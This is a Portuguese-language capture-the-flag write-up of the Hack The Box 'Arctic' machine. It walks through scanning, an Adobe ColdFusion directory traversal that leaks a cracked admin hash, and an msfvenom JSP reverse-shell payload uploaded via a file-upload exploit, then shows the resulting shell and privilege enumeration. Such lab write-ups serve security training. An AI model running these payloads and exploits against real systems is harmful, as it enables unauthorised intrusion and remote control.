---
title:     "Hack The Box - Arctic"
tags: [windows,easy,ColdFusion,CVE-2010-2861]
categories: HackTheBox
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/1.jpg)

## Enumeration

Iniciamos com nosso nmap 

```
root@kali:~/HTB-Windows/arctic# nmap -Pn -p- -T4 -oN nmap/allports_tcp 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 18:27 EDT
Stats: 0:02:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 55.64% done; ETC: 18:32 (0:02:06 remaining)
Nmap scan report for 10.10.10.11
Host is up (0.21s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 299.41 seconds
```

3 portas abertas, vamos continuar com a enumeracao

```
root@kali:~/HTB-Windows/arctic# nmap -sV -sC -p135,8500,49154 -oN nmap/specific_ports 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 18:45 EDT
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 18:48 (0:01:32 remaining)
Nmap scan report for 10.10.10.11
Host is up (0.19s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.13 seconds
```

fmtp?  Geralmente eu comeco pelas portas que seja mais desconhecidas, mas isso vai de cada um...

Como eu nao sei qual servico esta realmente rodando nessa porta, eu usei o proprio NC em modo verbose, mas nao foi muito util

tentei o amap tbm, mas nada de identificar

```
root@kali:~/HTB-Windows/arctic# amap -1 10.10.10.11 8500
amap v5.4 (www.thc.org/thc-amap) started at 2020-06-24 19:11:00 - APPLICATION MAPPING mode


Unidentified ports: 10.10.10.11:8300/tcp (total 1).

amap v5.4 finished at 2020-06-24 19:11:12
```

No entanto, como eh uma port 8500 e na maioria das vezes portas 8080,8081,8090 nessa faixa tem um servico web envolvido, entao eu acessei via browser 

**reference** http://www.networksorcery.com/enp/protocol/ip/ports08000.htm

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/2.jpg)

## Exploitation

Navegando nos diretorios encontrados e fazendo uma busca rapida no google podemos identificar que trata-se de um produto do ADOBE nossa missao agora eh identificar sua versao e/ou buscar exploits para isso.

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/3.jpg)

Encontrei 2 exploracoes interessantes, **Adobe ColdFusion - Directory Traversal** e **Adobe ColdFusion 2018 - Arbitrary File Upload** 

Acabei de testar o Directory Traversal e esta vuln

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/4.jpg)

Crack HASH rapiamente buscando no google encontramos a senha relacionada a hash encontrada

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/5.jpg)


```
 #Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true 
 HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
 SENHA: happyday
```

Tentei login com  a senha encontrada, mas sem sucesso

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/6.jpg)

Vamos tentar entao a segunda exploracao que encontramos **Adobe ColdFusion 2018 - Arbitrary File Upload**

## Reverse Shell

Depois de algumas pesquisas encontrei um exploit funcional https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload

Entao, gerei meu payload em jsp com o seguinte comando abaixo https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/

` msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.36 LPORT=53 -f raw > shell.jsp`

Start seu ouvinte na porta escolhida usando o nc, neste caso eu usei a porta 53

```
root@kali:~/HTB-Windows/arctic# rlwrap nc -nlvp 53
listening on [any] 53 ...
```

Execute o exploit

```
root@kali:~/HTB-Windows/arctic# python exploit.py 
Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp
root@kali:~/HTB-Windows/arctic# python exploit.py 10.10.10.11 8500 /root/HTB-Windows/arctic/shell.jsp 
Sending payload...
Successfully uploaded payload!
Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
```

E acesse via browser a URL http://10.10.10.11:8500/userfiles/file/exploit.jsp

![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/7.jpg)

## Privilege Escalation

Comecamos entao a fase de escalada, vamos la...

```
root@kali:~/HTB-Windows/arctic# rlwrap nc -nlvp 53
listening on [any] 53 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.11] 49650
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\ColdFusion8\runtime\bin>

```

Agora usando o systeminfo transferimos seu output paara nosso localhost

![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/8.jpg)

Output do systeminfo

```
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 §£
System Boot Time:          26/6/2020, 9:21:06 §£
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 318 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.189 MB
Virtual Memory: In Use:    858 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

